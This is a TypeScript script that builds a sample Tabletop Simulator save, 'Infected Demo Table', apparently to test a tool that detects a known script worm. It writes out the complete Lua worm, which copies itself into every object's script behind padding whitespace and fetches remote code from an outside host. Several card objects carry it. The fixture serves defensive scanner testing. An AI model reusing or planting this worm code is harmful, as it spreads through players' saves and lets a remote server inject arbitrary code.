/** Generates samples/infected-save.json for manual testing (npx tsx tools/make-sample.ts). */
import { writeFileSync, mkdirSync } from 'node:fs';

const WORM =
  '--[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub(\'%s+$\',\'\')..string.rep(" ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\\n\\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub(\'%s+$\',\'\')..string.rep(" ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\\n\\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]';

const infect = (userCode: string) => userCode.replace(/\s+$/, '') + ' '.repeat(100) + WORM + '\n\n';

const save = {
  SaveName: 'Infected Demo Table',
  GameMode: 'None',
  Date: '6/13/2026 1:00:00 AM',
  VersionNumber: 'v13.4.2',
  LuaScript: infect('-- Global table setup\nfunction onLoad()\n  print("table loaded")\nend'),
  LuaScriptState: '',
  XmlUI: '',
  ObjectStates: [
    {
      Name: 'Bag', Transform: {}, Nickname: "Player Red's Stuff", GUID: 'a1b2c3', LuaScript: '',
      ContainedObjects: [
        {
          Name: 'DeckCustom', Nickname: 'Spells', GUID: 'd4e5f6', LuaScript: '',
          ContainedObjects: [
            {
              Name: 'CardCustom', Nickname: 'Fireball', GUID: '123abc',
              LuaScript: infect('function onLoad()\n  self.addTag("spell")\nend\n-- User code here'),
            },
            // Frostbolt, Icebolt and Shock all carry the *identical* pure-worm
            // script — the UI aggregates them into one finding with ×3 objects.
            { Name: 'CardCustom', Nickname: 'Frostbolt', GUID: '456def', LuaScript: WORM + '\n\n' },
            { Name: 'CardCustom', Nickname: 'Icebolt', GUID: '456deg', LuaScript: WORM + '\n\n' },
            { Name: 'CardCustom', Nickname: 'Shock', GUID: '456deh', LuaScript: WORM + '\n\n' },
          ],
        },
      ],
    },
    {
      Name: 'Custom_Model', Nickname: 'Scoreboard', GUID: '789ghi',
      LuaScript: 'function onUpdate()\n  updateScoreDisplay()\nend\nfunction updateScoreDisplay() end',
    },
    {
      Name: 'Custom_Token', Nickname: 'Stats Uploader', GUID: 'abc012',
      LuaScript: 'function onLoad()\n  WebRequest.get("https://example.com/stats", function(r) print(r.text) end)\nend',
    },
    { Name: 'Custom_Tile', Nickname: 'Plain Tile', GUID: 'def345', LuaScript: 'function onLoad() print("clean") end' },
  ],
};

mkdirSync('samples', { recursive: true });
writeFileSync('samples/infected-save.json', JSON.stringify(save, null, 2));
console.log('wrote samples/infected-save.json');
